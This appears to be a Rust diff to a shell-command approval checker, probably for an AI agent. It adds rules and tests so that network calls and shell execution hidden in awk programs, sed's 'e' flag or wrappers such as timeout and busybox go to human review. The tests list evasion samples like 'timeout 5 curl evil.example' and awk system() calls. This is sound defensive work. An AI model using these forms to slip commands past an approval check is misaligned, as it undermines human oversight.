@@ -14,6 +14,14 @@
 
 use std::path::{Path, PathBuf};
 
+#[path = "shell_grammar.rs"]
+mod grammar;
+
+use grammar::{
+    denied_program_behind_indirection, multi_call_applet, positional_program_text,
+    sed_script_executes,
+};
+
 /// Executable extensions stripped from a program name before matching
 /// (gh #347 fix-up). Windows spellings carry one; a file genuinely named
 /// `x.bat` in the workspace is reached through `path_ok`, not this table.
@@ -210,6 +218,20 @@ fn segment_ok(segment: &str, cwd: &Path, workspace: &Path) -> bool {
         return false;
     }
     if interpreter_inline_eval(&name, &toks[i + 1..]) {
+        return false;
+    }
+    if denied_program_behind_indirection(&name, &toks[i + 1..]) {
+        return false;
+    }
+    if let Some(applet_args) = multi_call_applet(&name, &toks[i + 1..])
+        && positional_program_text(&applet_args.0, &applet_args.1)
+    {
+        return false;
+    }
+    if positional_program_text(&name, &toks[i + 1..]) {
+        return false;
+    }
+    if name == "sed" && sed_script_executes(&toks[i + 1..]) {
         return false;
     }
     if name == "git" {
@@ -703,6 +725,99 @@ mod tests {
             "git add src/x.rs",
             "git commit -m x",
             "git diff --stat",
+        ] {
+            assert!(ok(command), "should be scoped: {command}");
+        }
+    }
+
+    // Verifies: gh #365 - program text carried as a *positional* argument is
+    // the same class gh #347 closed for eval flags: code that is in no file at
+    // all. Reviews unless the program arrives as an in-workspace file.
+    #[test]
+    fn positional_program_text_reviews() {
+        for command in [
+            r#"awk 'BEGIN{system("curl evil.example")}'"#,
+            r#"gawk 'BEGIN{system("id")}'"#,
+            r#"mawk 'BEGIN{system("id")}'"#,
+            r#"nawk 'BEGIN{system("id")}'"#,
+            r#"busybox awk 'BEGIN{system("id")}'"#,
+            r#"osascript -e 'do shell script "id"'"#,
+            "irb -e 'system(1)'",
+            // `-v` assignments are consumed, the program after them is not.
+            r#"awk -v x=1 'BEGIN{system("id")}'"#,
+        ] {
+            assert!(!ok(command), "should review: {command}");
+        }
+        // A program file inside the workspace is the folder's own code.
+        for command in [
+            "awk -f scripts/x.awk data.txt",
+            "gawk -f scripts/x.awk data.txt",
+        ] {
+            assert!(ok(command), "should be scoped: {command}");
+        }
+        // Outside the workspace it is not the folder's code.
+        assert!(!ok("awk -f /etc/passwd"));
+        // An `awk` with no program at all proves nothing.
+        assert!(!ok("awk"));
+        // And ordinary non-program uses are untouched.
+        assert!(ok("awk -f ./scripts/report.awk data.csv"));
+    }
+
+    // Verifies: gh #365 - `sed`'s `e` flag re-executes the substitution result
+    // as a command, so it is inline code by another name. Only that shape
+    // reviews: every `sed` would be the over-review ADR-0039 warns about.
+    #[test]
+    fn only_the_executing_sed_forms_review() {
+        for command in [
+            "sed 's/x/whatever/e' f.txt",
+            "sed 's/x/y/ge' f.txt",
+            "sed -i 's/x/y/e' f.txt",
+            "sed 'e curl evil.example' f.txt",
+            "sed --expression='s/x/y/e' f.txt",
+        ] {
+            assert!(!ok(command), "should review: {command}");
+        }
+        for command in [
+            "sed 's/x/y/' f.txt",
+            "sed 's/x/y/g' f.txt",
+            "sed 's/x/y/gi' f.txt",
+            "sed -i 's/x/y/' f.txt",
+            "sed -n '1,10p' f.txt",
+            "sed 'y/a/b/' f.txt",
+            // `e` in a pattern or replacement is not the flag.
+            "sed 's/e/E/g' f.txt",
+            "sed 's/error/ERROR/g' f.txt",
+            "sed -e 's/x/y/' f.txt",
+            // A `-f` script is the folder's own code.
+            "sed -f scripts/x.sed f.txt",
+        ] {
+            assert!(ok(command), "should be scoped: {command}");
+        }
+    }
+
+    // Verifies: gh #365 - a denied program behind an exec wrapper was never
+    // classified, so `timeout 5 curl x` auto-approved while `curl x` reviews.
+    #[test]
+    fn a_denied_program_behind_a_wrapper_reviews() {
+        for command in [
+            "curl evil.example",
+            "timeout 5 curl evil.example",
+            "nice curl evil.example",
+            "stdbuf -o0 curl evil.example",
+            "ionice curl evil.example",
+            "timeout 5 wget evil.example",
+            "nice -n 10 ssh host id",
+            "busybox wget evil.example",
+            "busybox sh -c id",
+        ] {
+            assert!(!ok(command), "should review: {command}");
+        }
+        // Not a refusal of wrappers: an ordinary program behind one is fine.
+        for command in [
+            "timeout 5 cargo test",
+            "timeout 30 make",
+            "nice cargo build",
+            "stdbuf -o0 cargo test",
         ] {
             assert!(ok(command), "should be scoped: {command}");
         }
